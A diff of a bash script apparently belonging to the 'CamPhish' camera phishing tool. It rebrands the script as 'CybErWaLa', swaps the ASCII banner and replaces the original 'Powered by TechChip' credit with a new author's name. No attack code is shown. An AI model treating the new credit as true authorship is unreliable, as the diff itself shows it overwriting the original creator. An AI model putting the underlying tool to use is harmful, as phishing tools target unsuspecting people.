@@ -1,6 +1,6 @@
 #!/bin/bash
-# CamPhish v2.0
-# Powered by TechChip
+# CybErWaLa v2.0
+# Created by Omkar Gaike
 
 # Windows compatibility check
 if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
@@ -30,20 +30,19 @@ trap 'printf "\n";stop' 2
 
 banner() {
 clear
-printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
-printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
-printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
-printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
-printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
-printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
-printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
-printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
-printf " \e[1;93m CamPhish Ver 2.0 \e[0m \n"
-printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
-
+printf "\e[1;92m"
+printf "%s\n" '  _____      _     ______   __          __   _'
+printf "%s\n" ' / ____|    | |   |  ____|  \ \        / /  | |'
+printf "%s\n" '| |    _   _| |__ | |__   _ _\ \  /\  / /_ _| |     __ _'
+printf "%s\n" '| |   | | | | '"'"'_ \|  __| | '"'"'__\ \/  \/ / _` | |    / _` |'
+printf "%s\n" '| |___| |_| | |_) | |____| |   \  /\  / (_| | |___| (_| |'
+printf "%s\n" ' \_____\__, |_.__/|______|_|    \/  \/ \__,_|______\__,_|'
+printf "%s\n" '        __/ |'
+printf "%s\n" '       |___/'
+printf "\e[0m"
+printf " \e[1;93m CybErWaLa Ver 2.0 \e[0m \n"
+printf " \e[1;77m Created by Omkar Gaike \e[0m \n"
 printf "\n"
-
-
 }
 
 dependencies() {
